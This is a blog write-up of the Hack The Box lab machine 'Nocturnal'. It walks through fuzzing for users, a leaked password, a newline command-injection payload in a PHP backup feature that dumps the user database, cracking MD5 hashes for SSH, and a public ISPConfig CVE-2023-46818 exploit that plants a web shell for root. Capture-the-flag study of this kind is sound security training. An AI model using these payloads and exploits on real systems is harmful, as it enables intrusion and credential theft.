---
layout: post
title: HTB-Nocturnal
description: Walkthrough writeup of HTB machine Nocturnal
---

<p>In Nocturnal, we found creds by fuzzing a web application, exploited PHP for database access, cracked hashes for SSH, exploited ISPConfig, and gained root.</p>

<h2>Introduction</h2>
<p>In this post, I will walk you through the exploitation of the easy HTB machine called "Nocturnal". Overall, it was a fun experience but it is a bit harder as there a are a lot of steps and dead ends on which you can get stuck quite easily.</p>
<h2>Step 1: Running an Nmap scan on the target</h2>
<p>As always, we start with an Nmap scan on the target. I like to use the options -sC and -sV to run some Nmap scripts and do service detection, respectively. This allows us to capture a lot of information as a starting point.</p>

<pre>
nmap -p- -sV -sC 10.10.11.64
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-05 12:14 EDT
Nmap scan report for 10.10.11.64
Host is up (0.016s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.12 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 20:26:88:70:08:51:ee:de:3a:a6:20:41:87:96:25:17 (RSA)
|   256 4f:80:05:33:a6:d4:22:64:e9:ed:14:e3:12:bc:96:f1 (ECDSA)
|_  256 d9:88:1f:68:43:8e:d4:2a:52:fc:f0:66:d4:b9:ee:6b (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://nocturnal.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
</pre>

<p>On this box, we have an ssh service running as well as an nginx webservice. We are also being redirected to http://nocturnal.htb. Therefore, we need to add this to our hosts file (sudo vim /etc/hosts).</p>
<p>After adding the domainname to the hosts file. I like to run the nmap scan again to see if we get more data:</p>

<pre>
nmap -sC -sV -p- nocturnal.htb
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-05 12:43 EDT
Nmap scan report for nocturnal.htb (10.10.11.64)
Host is up (0.011s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.12 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 20:26:88:70:08:51:ee:de:3a:a6:20:41:87:96:25:17 (RSA)
|   256 4f:80:05:33:a6:d4:22:64:e9:ed:14:e3:12:bc:96:f1 (ECDSA)
|_  256 d9:88:1f:68:43:8e:d4:2a:52:fc:f0:66:d4:b9:ee:6b (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Welcome to Nocturnal
|_http-server-header: nginx/1.18.0 (Ubuntu)
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.08 seconds
</pre>

<p>In this case, this does not yield a lot of additional information except that the webservice is running on PHP and uses a PHPSessionId Cookie.</p>

<h2>Step 2: Exploring and enumerating the website</h2>
<p>Upon visiting the website, we are greeted with a generic welcome page:</p>
<img src="/images/Nocturnal/nocturnal_start_screen.webp" alt="generic welcome page" class="postImage">

<p>Looking closely, we get the option to register and login. So let's start by creating an account and login subsequently. Once logged in, we get a portal which allows us to upload files. Previously, our nmap scan revealed the server was running PHP. Therefore, I tried uploading a PHP reverse shell script. Unfortunately, It was not that easy as only office like extensions were allowed such as .doc, odt, .pdf. The first thing I tried was to use some common bypassing techniques which can be found here: <span class="url"><a href="https://0xn3va.gitbook.io/cheat-sheets/web-application/file-upload-vulnerabilities#extension">Bypassing upload restrictions</a></span>. I also tried playing around with the magic bytes but nothing seemed to work. Maybe there is another attack vector needed to gain access? Exploring a bit further, I noticed that the following url is being used when trying to access the files you uploaded: https://view.php?username=aion?file=test.doc. Therefore, I tried fuzzing this for other users using ffuf:</p>

<h2>Step 3: Gaining an initial foothold</h2>
<pre>
nocturnal 2
└─$ ffuf -u "http://nocturnal.htb/view.php?username=FUZZ&file=*.doc" -w /usr/share/wordlists/seclists/Usernames/Names/names.txt:FUZZ -H "Cookie: PHPSESSID=n3ifav8o86j8bp18nlbnfrpo5n" -fs 2985

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://nocturnal.htb/view.php?username=FUZZ&file=*.doc
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Usernames/Names/names.txt
 :: Header           : Cookie: PHPSESSID=n3ifav8o86j8bp18nlbnfrpo5n
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 2985
________________________________________________

admin                   [Status: 200, Size: 3037, Words: 1174, Lines: 129, Duration: 19ms]
amanda                  [Status: 200, Size: 3113, Words: 1175, Lines: 129, Duration: 24ms]
tobias                  [Status: 200, Size: 3037, Words: 1174, Lines: 129, Duration: 23ms]
:: Progress: [10177/10177] :: Job [1/1] :: 1680 req/sec :: Duration: [0:00:06] :: Errors: 0 ::
</pre>
<p>The results indicate that there are 3 other users on this box. Next, In the browser, I tried accessing these http request. When using amanda as the username I came across a privacy.odt file:</p>
<img src="/images/Nocturnal/nocturnal_amanda_files.webp" alt="Discovering a .odt file from the user amanda" class="postImage">
<p>The .odt file contained some credentials:</p>
<pre>
Dear Amanda,
Nocturnal has set the following temporary password for you: arHkG7HAI68X8s1J. This password has been set for all our services, so it is essential that you change it on your first login to ensure the security of your account and our infrastructure.
The file has been created and provided by Nocturnal's IT team. If you have any questions or need additional assistance during the password change process, please do not hesitate to contact us.
Remember that maintaining the security of your credentials is paramount to protecting your information and that of the company. We appreciate your prompt attention to this matter.

Yours sincerely,
Nocturnal's IT team
</pre>
<p>These credentials could be used to login to the portal as amanda. Logging in as amanda revealed an admin panel:</p>
<img src="/images/Nocturnal/nocturnal_amanda_login.webp" alt="amanda go to admin panel" class="postImage">
<img src="/images/Nocturnal/nocturnal_admin_panel.webp" alt="PHP files in admin panel" class="postImage">

<p>Visiting the admin panel, we discover a bunch of PHP scripts and the possibility of creating a backup upon providing a password for this backup. Examination of the PHP scripts revealed the path to database (possibly containing user credentials) and that admin.php is the most interesting as it appears to be vulnerable to command injection. I have pasted the vulnerable part here below:</p>
<pre>
function cleanEntry($entry) {
    $blacklist_chars = [';', '&', '|', '$', ' ', '`', '{', '}', '&&'];

    foreach ($blacklist_chars as $char) {
        if (strpos($entry, $char) !== false) {
            return false; // Malicious input detected
        }
    }

    return htmlspecialchars($entry, ENT_QUOTES, 'UTF-8');
}

if (isset($_POST['backup']) && !empty($_POST['password'])) {
    $password = cleanEntry($_POST['password']);
    $backupFile = "backups/backup_" . date('Y-m-d') . ".zip";

    if ($password === false) {
        echo "<div class='error-message'>Error: Try another password.</div>";
    } else {
        $logFile = '/tmp/backup_' . uniqid() . '.log';
       
        $command = "zip -x './backups/*' -r -P " . $password . " " . $backupFile . " .  > " . $logFile . " 2>&1 &";
        
        $descriptor_spec = [
            0 => ["pipe", "r"], // stdin
            1 => ["file", $logFile, "w"], // stdout
            2 => ["file", $logFile, "w"], // stderr
        ];

        $process = proc_open($command, $descriptor_spec, $pipes);
        if (is_resource($process)) {
            proc_close($process);
        }
</pre>
<p>Looking at the script, we can see that the password which we can input in the field is sanitized by the cleanEntry function. This function checks for certain blacklisted characters. Further, the $password field is being directly (after sanitation using cleanEntry) used as input for a system command "zip". therefore, it is possible to perform some kind of code injection. In a shell, a new command can be initiated by providing a newline. Exactly, you guessed it, the newline character is not present in the blacklist of cleanEntry meaning we can use it to escape the zip command and initiate a new command. How does this work exactly:</p>
<pre>
zip -x './backups' -r -P 
" .$backupfile ." . < ". $logfile ." " 2>&
</pre>
<p>The above is what happens if we provide a newline character in the password field. The above zip command error out as we do not provide a password and it registers the bottom line as a new command. This can be further expanded upon to execute a command to our liking by typing a newline character id and another newline character in the password field. Then, we get the following:</p>
<pre>
zip -x './backups' -r -P 
id
" .$backupfile ." . < ". $logfile ." " 2>&
</pre>
<p>Indeed, our id command get successfully executed. Now that we have command execution, I tried getting a reverse shell. However, I could not get it to work. The first problem I encountered was that I could not use spaces. This was not the biggest problem as this could be easily bypassed by using tabs (tabs and spaces are interpreted the same way by the shell). Once, I fixed that problem, It still did not work. I'm not exactly sure why but I suspect it had something to do with special characters needed for a reverse shell payload. Eventually, I noticed that it was much easier to dump the database exposing credentials instead of getting a reverse shell payload working. This is the payload I used:</p>
<pre>
sqlite3 ../nocturnal_database/nocturnal_database.db	.dump
url encoded: %0asqlite3%09..%2fnocturnal_database%2fnocturnal_database.db%09.dump
</pre>
<img src="/images/Nocturnal/nocturnal_dump_database_request.webp" alt="dumping database credentials" class="postImage">
<p>The dumped credentials exposed some md5 hashes of several users:</p>
<pre>
INSERT INTO users VALUES(1,'admin','d725aeba143f575736b07e045d8ceebb');
INSERT INTO users VALUES(2,'amanda','df8b20aa0c935023f99ea58358fb63c4');
INSERT INTO users VALUES(4,'tobias','55c82b1ccd55ab219b3b109b07d5061d');
INSERT INTO users VALUES(6,'kavi','f38cde1654b39fea2bd4f72f1ae4cdda');
INSERT INTO users VALUES(7,'e0Al5','101ad4543a96a7fd84908fd0d802e7db');
INSERT INTO users VALUES(8,'test','cc03e747a6afbbcbf8be7668acfebee5');
INSERT INTO users VALUES(9,'Aion','5f4dcc3b5aa765d61d8327deb882cf99');
INSERT INTO users VALUES(10,'asdasd','a8f5f167f44f4964e6c998dee827110c');
INSERT INTO users VALUES(11,'h4ck3r','2eb3ab7a66e08b7bfd84869eb758527c');
</pre>
<p>Cracking these with crackstation revealed the password of several users including that of tobias:</p>
<img src="/images/Nocturnal/Nocturnal_crackstation.webp" alt="cracked password hashes" class="postImage">
<p>These credentials could be used to login using ssh as tobias. In tobias home directory, we can find the user.txt flag:</p>
<pre>

──(kali㉿kali)-[~]
└─$ ssh tobias@nocturnal.htb
tobias@nocturnal.htb's password: 
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-212-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Sat 16 Aug 2025 09:30:43 AM UTC

  System load:           0.0
  Usage of /:            57.7% of 5.58GB
  Memory usage:          17%
  Swap usage:            0%
  Processes:             228
  Users logged in:       1
  IPv4 address for eth0: 10.10.11.64
  IPv6 address for eth0: dead:beef::250:56ff:fe94:6fed


Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Sat Aug 16 09:30:43 2025 from 10.10.14.47
tobias@nocturnal:~$ 

tobias@nocturnal:~$ ls
user.txt
</pre>
<h2>Step 4: Escalating privileges to root</h2>
<p>Escalating privileges on this box was not easy. I looked around and did not find anything obvious that stood out. We were not allowed to run anything as sudo on this box. Running linpeas did also not find anything that immediately stood out. In other words, I was kinda stuck. Googling and trying a lot of stuff, I suddenly came across something quite interesting:</p>
<pre>
netstat -tupln
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 127.0.0.1:8080          0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -    
</pre>
<p>There is a local webserver running on port 8080! Knowing this, we can forward this using ssh to our local machine:</p>

<pre>
┌──(kali㉿kali)-[~]
└─$ ssh -L 1234:127.0.0.1:8080 tobias@10.10.11.64                                                                                                       
tobias@10.10.11.64's password: 
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-212-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Sat 16 Aug 2025 09:59:43 AM UTC

  System load:           0.12
  Usage of /:            61.1% of 5.58GB
  Memory usage:          22%
  Swap usage:            0%
  Processes:             252
  Users logged in:       1
  IPv4 address for eth0: 10.10.11.64
  IPv6 address for eth0: dead:beef::250:56ff:fe94:6fed


Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Sat Aug 16 09:59:43 2025 from 10.10.14.47
</pre>
<p>After running this command, we can access this webserver by surfing to https://127.0.01:1234</p>
<img src="/images/Nocturnal/nocturnal_Internal_webserver.webp" alt="Accessing the internal webserver" class="postImage">
<p>We are greeted with a login screen. Trying the combination of "admin" as the username and tobias password seems to work and gives us access to the admin panel of the service.</p>
<p>Knowing that it is a ISPConfig service, I immediately started googling whether there are some known vulnerabilities. We are in luck, there seems to be a known PHP code injection! As the box was about to expire on Hackthebox, I found a working proof of concept exploit and ran it which gave us root (normally I like to do manual exploitation instead of running a script):</p>
<pre>
┌──(kali㉿kali)-[/opt/CVE-2023-46818]
└─$ python3 CVE-2023-46818.py "127.0.0.1:1234" admin slowmotionapocalypse                                                                                                                                                                                                                                                  
[-] URL missing scheme (http:// or https://), adding http:// by default.
[+] Logging in with username 'admin' and password 'slowmotionapocalypse'
[+] Login successful!
[+] Fetching CSRF tokens...
[+] CSRF ID: language_edit_0d7ecbea30da0b7541401231
[+] CSRF Key: 5a0108eb810590fd242285bc4305877e5969dec0
[+] Injecting shell payload...
[+] Shell written to: http://127.0.0.1:1234/admin/sh.php
[+] Launching shell...

ispconfig-shell# whoami
root

ispconfig-shell# ls /root
root.txt
</pre>

<h2>Final thoughts</h2>
<p>Overall, This was a nice box. It also wasn't that easy. I was to focussed on bypassing the file upload blacklist. As a result, it tool a long time until I found out it was a dead end. The PHP code injection was interesting. Furthermore, during the privilege escalation, I learned to check for other local services on the box, which could be useful for future boxes</p>
<a href="/">Go to the Home Page</a>



